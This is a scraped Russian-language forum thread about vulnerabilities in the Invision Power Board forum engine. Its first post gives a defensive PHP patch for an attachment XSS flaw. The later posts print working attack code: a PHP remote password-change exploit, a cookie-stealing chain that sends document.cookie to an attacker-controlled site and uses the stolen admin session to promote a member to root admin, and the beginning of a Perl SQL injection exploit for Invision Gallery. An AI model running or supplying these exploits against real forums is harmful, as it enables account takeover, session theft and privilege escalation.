onclick="window.open(this.href);return false;"><span style="color: #0000a0;" class="username-coloured">Marvin</span></a><a href="viewtopic.php?p=69851&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p69851" onclick="window.open(this.href);return false;"><img src="./styles/prosilver/imageset/icon_topic_latest.gif" width="11" height="9" alt="Перейти к последнему сообщению" title="Перейти к последнему сообщению" /></a> <br /> 31 окт 2008 03:41<br /> </span></dd></dl></li><li class="row bg2"><dl class="icon" style="background-image: url(./styles/prosilver/imageset/topic_read_hot.gif); background-repeat: no-repeat;"><dt ><a href="viewtopic.php?f=16&amp;t=4721&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="topictitle" onclick="window.open(this.href);return false;">Поиск неточностей и ошибок в новом дизайне форума</a><br /><strong class="pagination"><span><a href="viewtopic.php?f=16&amp;t=4721&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">1</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=4721&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10">2</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=4721&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=20">3</a><span class="page-sep">, </span><a href="viewtopic.php?f=16&amp;t=4721&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=30">4</a></span></strong> <a href="memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #ff8000;" class="username-coloured">Lenar</span></a> в форуме <a href="viewforum.php?f=16&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">Работа Mega Obzor и Полезного форума</a></dt><dd class="posts">33</dd><dd class="views">7181</dd><dd class="lastpost"><span> <a href="memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #ff8000;" class="username-coloured">Lenar</span></a><a href="viewtopic.php?p=81815&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p81815" onclick="window.open(this.href);return false;"><img src="./styles/prosilver/imageset/icon_topic_latest.gif" width="11" height="9" alt="Перейти к последнему сообщению" title="Перейти к последнему сообщению" /></a> <br /> 13 фев 2009 13:24<br /> </span></dd></dl></li><li class="row bg1"><dl class="icon" style="background-image: url(./styles/prosilver/imageset/topic_read.gif); background-repeat: no-repeat;"><dt ><a href="viewtopic.php?f=16&amp;t=5938&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="topictitle" onclick="window.open(this.href);return false;">7-8 апреля будет проходит редизайн форума</a><br /> <a href="memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #ff8000;" class="username-coloured">Lenar</span></a> в форуме <a href="viewforum.php?f=16&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;">Работа Mega Obzor и Полезного форума</a></dt><dd class="posts">6</dd><dd class="views">1389</dd><dd class="lastpost"><span> <a href="memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" onclick="window.open(this.href);return false;"><span style="color: #ff8000;" class="username-coloured">Lenar</span></a><a href="viewtopic.php?p=85519&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p85519" onclick="window.open(this.href);return false;"><img src="./styles/prosilver/imageset/icon_topic_latest.gif" width="11" height="9" alt="Перейти к последнему сообщению" title="Перейти к последнему сообщению" /></a> <br /> 10 апр 2009 01:28<br /> </span></dd></dl></li></ul><span class="corners-bottom"><span></span></span></div></div><p></p><p><a href="./viewforum.php?f=50&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" class="left-box left" accesskey="r">Вернуться в Уязвимости и эксплойты</a></p><form method="post" id="jumpbox" action="./viewforum.php?sid=41cb0d0b2bd68889d75904888b8b4b4a" onsubmit="if(this.f.value == -1){return false;}">
<fieldset class="jumpbox"><label for="f" accesskey="j">Перейти:</label><select name="f" id="f" onchange="if(this.options[this.selectedIndex].value != -1){ document.forms['jumpbox'].submit() }"><option value="-1">Выберите форум</option><option value="-1">------------------</option><option value="108">Софт</option><option value="6">&nbsp; &nbsp;Мир софта</option><option value="57">&nbsp; &nbsp;&nbsp; &nbsp;Интернет и сети</option><option value="58">&nbsp; &nbsp;&nbsp; &nbsp;Мультимедия</option><option value="59">&nbsp; &nbsp;&nbsp; &nbsp;Графические программы</option><option value="51">&nbsp; &nbsp;&nbsp; &nbsp;Система</option><option value="60">&nbsp; &nbsp;&nbsp; &nbsp;Офис и дисковые утилиты</option><option value="7">&nbsp; &nbsp;&nbsp; &nbsp;WebTeam SMM</option><option value="50" selected="selected">&nbsp; &nbsp;Уязвимости и эксплойты</option><option value="45">&nbsp; &nbsp;&nbsp; &nbsp;Вирусная лаборатория и Безопасность</option><option value="109">Железо и Гаджеты</option><option value="39">&nbsp; &nbsp;Компьютерное железо</option><option value="94">&nbsp; &nbsp;&nbsp; &nbsp;Сист.блоки</option><option value="95">&nbsp; &nbsp;&nbsp; &nbsp;Матер.платы</option><option value="96">&nbsp; &nbsp;&nbsp; &nbsp;Блоки питания</option><option value="97">&nbsp; &nbsp;&nbsp; &nbsp;Видеокарты</option><option value="98">&nbsp; &nbsp;&nbsp; &nbsp;Процессоры</option><option value="99">&nbsp; &nbsp;&nbsp; &nbsp;Опер.память</option><option value="100">&nbsp; &nbsp;&nbsp; &nbsp;Охлажд.системы</option><option value="101">&nbsp; &nbsp;&nbsp; &nbsp;Накопители</option><option value="102">&nbsp; &nbsp;&nbsp; &nbsp;Ноутбуки</option><option value="43">&nbsp; &nbsp;Вопросы по операционным системам</option><option value="78">&nbsp; &nbsp;&nbsp; &nbsp;Linux</option><option value="79">&nbsp; &nbsp;&nbsp; &nbsp;MacOS</option><option value="80">&nbsp; &nbsp;&nbsp; &nbsp;Windows 7</option><option value="17">&nbsp; &nbsp;Мобильные телефоны</option><option value="52">&nbsp; &nbsp;&nbsp; &nbsp;Pocket PC</option><option value="110">Творчество</option><option value="34">&nbsp; &nbsp;Компьютерная графика и фотография.</option><option value="65">&nbsp; &nbsp;&nbsp; &nbsp;Фотосеты мужчин и женщин</option><option value="91">&nbsp; &nbsp;&nbsp; &nbsp;Искусство фотографии</option><option value="67">&nbsp; &nbsp;Уроки Photoshop. Авторские уроки фотошоп. Конкурс уроки фотошопа</option><option value="89">&nbsp; &nbsp;&nbsp; &nbsp;Полезности Photoshop</option><option value="90">&nbsp; &nbsp;&nbsp; &nbsp;Работы Photoshop</option><option value="103">&nbsp; &nbsp;&nbsp; &nbsp;Аватары</option><option value="69">&nbsp; &nbsp;&nbsp; &nbsp;Обои</option><option value="22">&nbsp; &nbsp;Дизайн и раскрутка</option><option value="36">&nbsp; &nbsp;&nbsp; &nbsp;Создание сайтов от А до Я</option><option value="42">&nbsp; &nbsp;Всемирная паутина</option><option value="111">Развлечения</option><option value="9">&nbsp; &nbsp;Игры</option><option value="70">&nbsp; &nbsp;&nbsp; &nbsp;Мир WarCraft</option><option value="71">&nbsp; &nbsp;&nbsp; &nbsp;ММПОРГ</option><option value="72">&nbsp; &nbsp;&nbsp; &nbsp;Экшен</option><option value="73">&nbsp; &nbsp;&nbsp; &nbsp;Симуляторы и Спортивные</option><option value="74">&nbsp; &nbsp;&nbsp; &nbsp;Стратегии и RPG</option><option value="105">&nbsp; &nbsp;&nbsp; &nbsp;Квесты</option><option value="75">&nbsp; &nbsp;&nbsp; &nbsp;Читы к играм</option><option value="48">&nbsp; &nbsp;Кино и телевидение</option><option value="86">&nbsp; &nbsp;&nbsp; &nbsp;Легенды нашего кино</option><option value="85">&nbsp; &nbsp;&nbsp; &nbsp;Сериалы</option><option value="87">&nbsp; &nbsp;&nbsp; &nbsp;Мультфильмы</option><option value="88">&nbsp; &nbsp;&nbsp; &nbsp;ТВ программы</option><option value="92">&nbsp; &nbsp;&nbsp; &nbsp;Саундтреки к фильмам (film soundtrack)</option><option value="104">&nbsp; &nbsp;&nbsp; &nbsp;Сумерки</option><option value="10">&nbsp; &nbsp;Музыка и литература</option><option value="76">&nbsp; &nbsp;&nbsp; &nbsp;Исполнители</option><option value="77">&nbsp; &nbsp;&nbsp; &nbsp;Писатели</option><option value="116">&nbsp; &nbsp;Вокруг света</option><option value="112">Life</option><option value="18">&nbsp; &nbsp;Спорт и Здоровье</option><option value="82">&nbsp; &nbsp;&nbsp; &nbsp;Хоккей</option><option value="81">&nbsp; &nbsp;&nbsp; &nbsp;Футбол</option><option value="84">&nbsp; &nbsp;&nbsp; &nbsp;Факты о здоровье</option><option value="53">&nbsp; &nbsp;Автомобили</option><option value="119">&nbsp; &nbsp;&nbsp; &nbsp;Авто хиты</option><option value="83">&nbsp; &nbsp;&nbsp; &nbsp;Автоспорт</option><option value="120">&nbsp; &nbsp;&nbsp; &nbsp;Авто новости</option><option value="25">&nbsp; &nbsp;Жизнь</option><option value="118">&nbsp; &nbsp;&nbsp; &nbsp;Быт</option><option value="107">&nbsp; &nbsp;&nbsp; &nbsp;Дети</option><option value="68">&nbsp; &nbsp;&nbsp; &nbsp;Финансы</option><option value="26">&nbsp; &nbsp;&nbsp; &nbsp;Политика</option><option value="93">&nbsp; &nbsp;&nbsp; &nbsp;Катастрофы</option><option value="37">&nbsp; &nbsp;&nbsp; &nbsp;Образование</option><option value="44">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Программирование</option><option value="19">&nbsp; &nbsp;Кулинарная книга</option><option value="117">&nbsp; &nbsp;&nbsp; &nbsp;Напитки</option><option value="106">&nbsp; &nbsp;Живность</option><option value="115">&nbsp; &nbsp;&nbsp; &nbsp;Домашние растения</option><option value="113">Отношения</option><option value="13">&nbsp; &nbsp;Отношения между любимыми</option><option value="66">&nbsp; &nbsp;&nbsp; &nbsp;Психология</option><option value="62">&nbsp; &nbsp;&nbsp; &nbsp;Секс</option><option value="61">&nbsp; &nbsp;Контрацепция, беременность, роды</option><option value="64">&nbsp; &nbsp;Интересные факты, мифы</option><option value="63">&nbsp; &nbsp;&nbsp; &nbsp;Физиология, анатомия</option><option value="114">Общее</option><option value="16">&nbsp; &nbsp;Работа Mega Obzor и Полезного форума</option><option value="4">&nbsp; &nbsp;&nbsp; &nbsp;Специальная тема</option><option value="28">&nbsp; &nbsp;Конкурсы</option><option value="47">&nbsp; &nbsp;Беседка</option><option value="49">&nbsp; &nbsp;&nbsp; &nbsp;Юмор</option><option value="54">&nbsp; &nbsp;&nbsp; &nbsp;Таблетки от жадности</option><option value="46">&nbsp; &nbsp;Корзина</option></select><input type="submit" value="Перейти" class="button2" /></fieldset></form>
<h3>Кто сейчас на сайте</h3><p>Сейчас этот форум просматривают: нет зарегистрированных пользователей и гости: 1</p></div>
<div id="page-footer">
<div class="navbar"><div class="inner"><span class="corners-top"><span></span></span>
<ul class="linklist"><li class="icon-home"><a href="./index.php?sid=41cb0d0b2bd68889d75904888b8b4b4a" accesskey="h">Список форумов</a></li><li class="rightside"><a href="./ucp.php?mode=delete_cookies&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Удалить cookies конференции</a> &bull; Часовой пояс: UTC + 4 часа </li></ul>
<span class="corners-bottom"><span></span></span></div></div>
<div id="counter"></div>
<div class="copyright"><script src="http://megaobzor.com/javascripts/li2.js.gz"></script>﻿2006-2012 MegaObzor. © SMM CMS, phpbbex (Свид-во гос.регистрации программы для ЭВМ №2009611099). Все размещенные материалы являются интеллектуальной собственностью их Авторов. Копирование материалов только с указанием прямой ссылки на <a href="http://megaobzor.com">Mega Obzor.com</a>&copy;</div>
<div class="clear"></div></div><script src="http://megaobzor.com/javascripts/mopack2.js.gz"></script><div><a id="bottom" name="bottom" accesskey="z"></a></div>
</div>
</body></html>||Уязвимости форума IPB и их устранение - Уязвимости и эксплойты - Форум Mega Obzor||Пропустить||Форумы|Список форумов|Активные темы|Темы без ответов|Поиск в форумах|MegaObzor||Регистрация|Вход||Уязвимости форума IPB и их устранение|Версия для печати|Список форумов||&#8250;||Софт||&#8250;||Уязвимости и эксплойты||Описание:|Обзор уязвимостей и защита движков порталов, движков форумов, чатов. Раздел направлен на защиту всех известных движков. |Модераторы:||Queen Clarion|, |HardMind|, |ReAl_rus|, |shaman||Ответить||Сообщений: 12 &bull; |Страница 1 из 2|&bull; |1|, |2||Уязвимости форума IPB и их устранение||Lenar|&raquo; 18 июн 2007 01:52 ||XSS инъекция в ipb 2.1.x и 2.2.x|XSS инъекция через прикрепляемые файлы Уязвимость возникает из-за того что Invision Power Board позволяет пользователю загрузить изображение или PDF файл, содержащий JavaScript. Данный скрипт срабатывает при открытии прикрепления пользователем, так как это происходит в контексте браузерной сессии это позволяет злоумышленнику получить всю информацию о данной сессии. Пример/Эксплоит: Нет Исправление 2.1.7: Открыть файл ./ips_kernel/class_upload.php, найти: |Код: |Выделить всё|if &#40; $this-&gt;make_script_safe &#41; &#123; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;$/i&quot;, $FILE_NAME &#41; &#41; &#123; $FILE_TYPE = 'text/plain'; $this-&gt;file_extension = 'txt'; &#125; &#125; Заменить на: CODE $renamed = 0; if &#40; $this-&gt;make_script_safe &#41; &#123; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;/&quot;, $FILE_NAME &#41; &#41; &#123; $FILE_TYPE = 'text/plain'; $this-&gt;file_extension = 'txt'; $renamed = 1; &#125; &#125;|Найти: i|Код: |Выделить всё|f &#40; ! @move_uploaded_file&#40; $_FILES&#91; $this-&gt;upload_form_field &#93;&#91;'tmp_name'&#93;, $this-&gt;saved_upload_name&#41; &#41; &#123; $this-&gt;error_no = 4; return; &#125; else &#123; @chmod&#40; $this-&gt;saved_upload_name, 0777 &#41;; &#125;|Добавить после: |Код: |Выделить всё|if&#40; !$renamed &#41; &#123; $this-&gt;check_xss_infile&#40;&#41;; if&#40; $this-&gt;error_no &#41; &#123; return; &#125; &#125;|Найти: |Код: |Выделить всё|/*-------------------------------------------------------------------------*/ // INTERNAL: Get file extension /*-------------------------------------------------------------------------*/ /** * Returns the file extension of the current filename * * @param string Filename */ function _get_file_extension&#40;$file&#41; &#123; return strtolower&#40; str_replace&#40; &quot;.&quot;, &quot;&quot;, substr&#40; $file, strrpos&#40; $file, '.' &#41; &#41; &#41; &#41;; &#125;|Добавить перед: |Код: |Выделить всё|CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Check for XSS inside file /*-------------------------------------------------------------------------*/ /** * Checks for XSS inside file. If found, sets error_no to 5 and returns * * @param void */ function check_xss_infile&#40;&#41; &#123; // HTML added inside an inline file is not good in IE... $fh = fopen&#40; $this-&gt;saved_upload_name, 'rb' &#41;; $file_check = fread&#40; $fh, 512 &#41;; fclose&#40; $fh &#41;; if&#40; !$file_check &#41; &#123; @unlink&#40; $this-&gt;saved_upload_name &#41;; $this-&gt;error_no = 5; return; &#125; # Thanks to Nicolas Grekas from comments at www.splitbrain.org for helping to identify all vulnerable HTML tags else if&#40; preg_match&#40; &quot;#&lt;script|&lt;html|&lt;head|&lt;title|&lt;body|&lt;pre|&lt;table|&lt;a\s+href|&lt;img|&lt;plaintext#si&quot;, $file_check &#41; &#41; &#123; @unlink&#40; $this-&gt;saved_upload_name &#41;; $this-&gt;error_no = 5; return; &#125; &#125; |Исправление 2.2.2:|Открыть файл ./ips_kernel/class_upload.php, найти: |Код: |Выделить всё|CODE if &#40; $this-&gt;make_script_safe &#41; &#123; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;$/i&quot;, $FILE_NAME &#41; &#41; &#123; $FILE_TYPE = 'text/plain'; $this-&gt;file_extension = 'txt'; &#125; &#125; Заменить на: CODE $renamed = 0; if &#40; $this-&gt;make_script_safe &#41; &#123; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;/&quot;, $FILE_NAME &#41; &#41; &#123; $FILE_TYPE = 'text/plain'; $this-&gt;file_extension = 'txt'; $this-&gt;parsed_file_name = preg_replace&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;&#40;\.|$&#41;/i&quot;, &quot;$2&quot;, $this-&gt;parsed_file_name &#41;; $renamed = 1; &#125; &#125;|Найти: |Код: |Выделить всё|CODE if &#40; ! @move_uploaded_file&#40; $_FILES&#91; $this-&gt;upload_form_field &#93;&#91;'tmp_name'&#93;, $this-&gt;saved_upload_name&#41; &#41; &#123; $this-&gt;error_no = 4; return; &#125; else &#123; @chmod&#40; $this-&gt;saved_upload_name, 0777 &#41;; &#125; Добавить после: CODE if&#40; !$renamed &#41; &#123; $this-&gt;check_xss_infile&#40;&#41;; if&#40; $this-&gt;error_no &#41; &#123; return; &#125; &#125; |Найти: |Код: |Выделить всё|CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Get file extension /*-------------------------------------------------------------------------*/ /** * Returns the file extension of the current filename * * @param string Filename */ function _get_file_extension&#40;$file&#41; &#123; return strtolower&#40; str_replace&#40; &quot;.&quot;, &quot;&quot;, substr&#40; $file, strrpos&#40; $file, '.' &#41; &#41; &#41; &#41;; &#125; |Добавить перед: |Код: |Выделить всё|CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Check for XSS inside file /*-------------------------------------------------------------------------*/ /** * Checks for XSS inside file. If found, sets error_no to 5 and returns * * @param void */ function check_xss_infile&#40;&#41; &#123; // HTML added inside an inline file is not good in IE... $fh = fopen&#40; $this-&gt;saved_upload_name, 'rb' &#41;; $file_check = fread&#40; $fh, 512 &#41;; fclose&#40; $fh &#41;; if&#40; !$file_check &#41; &#123; @unlink&#40; $this-&gt;saved_upload_name &#41;; $this-&gt;error_no = 5; return; &#125; # Thanks to Nicolas Grekas from comments at www.splitbrain.org for helping to identify all vulnerable HTML tags else if&#40; preg_match&#40; &quot;#&lt;script|&lt;html|&lt;head|&lt;title|&lt;body|&lt;pre|&lt;table|&lt;a\s+href|&lt;img|&lt;plaintext#si&quot;, $file_check &#41; &#41; &#123; @unlink&#40; $this-&gt;saved_upload_name &#41;; $this-&gt;error_no = 5; return; &#125; &#125; |Скачать измененный файл для версий 2.1.x: |http://forums.invisionpower.com/|Скачать измененный файл для версий 2.2.x: |http://forums.invisionpower.com/|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||Lenar|&raquo; 29 фев 2008 19:11 ||Invision Power Board v2.1.7|Remote Password Change Exploit |Код: |Выделить всё|&lt;?php /* Debug Mode password change vulnerability Affects Invision Power Borard 2.0.0 to 2.1.7 by Rapigator This works if: &quot;Debug Level&quot; is set to 3 or Enable SQL Debug Mode is turned on In General Configuration of the forum software. */ // The forum's address up to and including 'index.php' $site = &quot;http://localhost/forums/index.php&quot;; // An existing user's login name $name = &quot;admin&quot;; // The new password&#40;3-32 characters&#41; $pass = &quot;1234&quot;; // You can use a proxy... // $proxy = &quot;1.2.3.4:8080&quot;; // ----------------------------- $site .= &quot;?&quot;; $suffix = &quot;&quot;; $name = urlencode&#40;$name&#41;; $pass = urlencode&#40;$pass&#41;; $curl = curl_init&#40;$site.'act=Reg&amp;CODE=10'&#41;; curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; $page = curl_exec&#40;$curl&#41;; curl_close&#40;$curl&#41;; if &#40;preg_match&#40;'/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;&#40;&#91;\\w&#93;*?&#41;_reg_antispam&lt;\/span&gt; \\&#40;regid,regcode,ip_address,ctime\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;*?&#41;,/', $page, $regs&#41;&#41; &#123; $prefix = $regs&#91;1&#93;; $regid = $regs&#91;2&#93;; $regcode = $regs&#91;3&#93;; &#125; else &#123; $suffix = &quot;&amp;debug=1&quot;; $curl = curl_init&#40;$site.'act=Reg&amp;CODE=10'.$suffix&#41;; curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; $page = curl_exec&#40;$curl&#41;; curl_close&#40;$curl&#41;; if &#40;preg_match&#40;'/INSERT INTO &#40;&#91;\\w&#93;*?&#41;_reg_antispam \\&#40;regid,regcode,ip_address,ctime\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;*?&#41;,/', $page, $regs&#41;&#41; &#123; $prefix = $regs&#91;1&#93;; $regid = $regs&#91;2&#93;; $regcode = $regs&#91;3&#93;; &#125; &#125; if &#40;!isset&#40;$regid&#41; |!isset&#40;$regcode&#41;&#41; &#123; echo &quot;Error: Probably not vulnerable, or no forum found&quot;; exit; &#125; $curl = curl_init&#40;$site.$suffix&#41;; curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; curl_setopt&#40;$curl, CURLOPT_POST, 1&#41;; curl_setopt&#40;$curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=11&amp;member_name=&#123;$name&#125;&amp;regid=&#123;$regid&#125;&amp;reg_code=&#123;$regcode&#125;&quot;&#41;; curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; $page = curl_exec&#40;$curl&#41;; curl_close&#40;$curl&#41;; if &#40;preg_match&#40;'/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;'.$prefix.'_validating&lt;\/span&gt; \\&#40;vid,member_id,real_group,temp_group,entry_date, coppa_user,lost_pass,ip_address\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;&#123;1,32&#125;?&#41;,/', $page, $regs&#41;&#41; &#123; change_pass&#40;$regcode,$regid,$regs&#91;1&#93;,$regs&#91;2&#93;&#41;; &#125; if &#40;preg_match&#40;'/INSERT INTO '.$prefix.'_validating \\&#40;vid,member_id,real_group,temp_group,entry_date, coppa_user,lost_pass,ip_address\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;&#123;1,32&#125;?&#41;,/', $page, $regs&#41;&#41; &#123; change_pass&#40;$regcode,$regid,$regs&#91;1&#93;,$regs&#91;2&#93;&#41;; &#125; function change_pass&#40;$regcode,$regid,$vid,$userid&#41; &#123; global $site, $proxy, $name, $pass; $curl = curl_init&#40;$site.$suffix&#41;; curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; curl_setopt&#40;$curl, CURLOPT_POST, 1&#41;; curl_setopt&#40;$curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=03&amp;type=lostpass&amp;uid=&#123;$userid&#125;&amp;aid=&#123;$vid&#125;&amp;regid=&#123;$regid&#125;&amp;reg_code=&#123;$regcode&#125;&amp;pass1=&#123;$pass&#125;&amp;pass2=&#123;$pass&#125;&quot;&#41;; curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; $page = curl_exec&#40;$curl&#41;; curl_close&#40;$curl&#41;; echo &quot;Password Changed!&quot;; exit; &#125; ?&gt;|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||svn|&raquo; 29 фев 2008 19:13 ||Lenar|, а к 2.3.4 слабо выложить? ||svn|Ветеран|Откуда:|UA|Сообщения:|826||Вернуться к началу||Lenar|&raquo; 29 фев 2008 19:16 ||Invision Power Board v2.2.2 |Код: |Выделить всё|&lt;?php $target = &quot;http://www.yourtarget.com/forum&quot;; #Target forum without trailing slash $prefix = &quot;ibf_&quot;; #Database prefix, default: ibf_ $member = 22; #Member id to promote $newgroup = 4; # The id of the new group to promote, normally 4 is root admin $ip = $_SERVER&#91;'REMOTE_ADDR'&#93;; $referer = $_SERVER&#91;'HTTP_REFERER'&#93;; $agent = $_SERVER&#91;'HTTP_USER_AGENT'&#93;; $data = $_GET&#91;'c'&#93;; $time = date&#40;&quot;Y-m-d G:i:s A&quot;&#41;; $text = &quot;Time: &quot;.$time.&quot;\nIP:&quot;.$ip.&quot;\nReferer:&quot;.$referer.&quot;\nUser-Agent:&quot;.$agent.&quot;\nCookie:&quot;.$data.&quot;\n\n&quot;; $file = fopen&#40;'log.txt' , 'a'&#41;; fwrite&#40;$file,$text&#41;; fclose&#40;$file&#41;; if&#40;preg_match&#40;&quot;/ipb_admin_session_id=&#40;&#91;0-9a-z&#93;&#123;32&#125;&#41;;/&quot;,$data,$stuff&#41;&#41; &#123; print '&lt;img width=0 height=0 src=&quot;'.$target.'/admin/index.php?adsess='.$stuff&#91;1&#93;.'&amp;act=sql&amp;code=runsql&amp;section=admin&amp;query=UPDATE+ '.$prefix.'members+SET +mgroup+%3D+%27'.$newgroup.'%27+WHERE+id+%3D+%27'. $member.'%27&amp;st=&quot;&gt;&lt;/&gt;'; &#125; ?&gt; # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # Also create a file in the same directory named &quot;log.txt&quot; and chmod it 777 # # Now, create a file called script.js on your webserver, put this code in it: # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # document.location=&quot;http://www.yourownsite.com/path/to/file/name.php?c=&quot;+document.cookie; # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # And, last but not least, create a file that combines those two;&#41; # Name it blah.html and put this code in it: # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # &lt;iframe border=0 src=&quot;http://www.targetforum.com/forum_folder/jscripts/folder_rte_files/module_table.php?editorid=//--&gt;&lt;/ script&gt;&lt;script src=http://www.yourownsite.com/path/to/file/script.js&gt;&quot; width=0 height=0&gt;&lt;/iframe&gt;|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||divir|&raquo; 02 мар 2008 17:38 ||Кстати не плохо было бы рассматривать не только сами движки, но популярные моды к нему|Я начну: |Invision Gallery version &lt;= 2.0.7 sql injection exploit|(c) 1dt.w0lf RST/GHC |Код: |Выделить всё|#!/usr/bin/perl ## Invision Gallery version &lt;= 2.0.7 sql injection exploit ## &#40;c&#41;oded by 1dt.w0lf ## RST/GHC ## THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE ## KEEP IT PRIVATE use Tk; use Tk::BrowseEntry; use Tk::DialogBox; use LWP::UserAgent; $mw = new MainWindow&#40;title =&gt; &quot;r57ig207&quot; &#41;; $mw-&gt;geometry &#40; '420x510' &#41; ; $mw-&gt;resizable&#40;0,0&#41;; $mw-&gt;Label&#40;-text =&gt; '!', -font =&gt; '&#123;Webdings&#125; 22'&#41;-&gt;pack&#40;&#41;; $mw-&gt;Label&#40;-text =&gt; 'Invision Gallery &lt;=2.0.7 sql injection exploit by RST/GHC', -font =&gt; '&#123;Verdana&#125; 7 bold',-foreground=&gt;'red'&#41;-&gt;pack&#40;&#41;; $mw-&gt;Label&#40;-text =&gt; ''&#41;-&gt;pack&#40;&#41;; $fleft=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'ne'&#41; ; $fright=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'nw'&#41; ; $url = 'http://server/forum/index.php'; $user_id = '1'; $prefix = 'ibf_'; $table = 'members'; $column = 'member_login_key'; $new_admin_name = 'rstghc'; $new_admin_password = 'rstghc'; $new_admin_email = 'billy@microsoft.com'; $report = ''; $group = 1; $curr_user = 0; $use_custom_fields = 0; $custom_fields = 'name1=value1,name2=value2'; $fleft-&gt;Label &#40; -text =&gt; 'Path to forum index: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$url&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; $fleft-&gt;Label &#40; -text =&gt; 'User ID: ', -font =&gt; '&#123;Verdana&#125; 8 bold' &#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; $fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; \$user_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 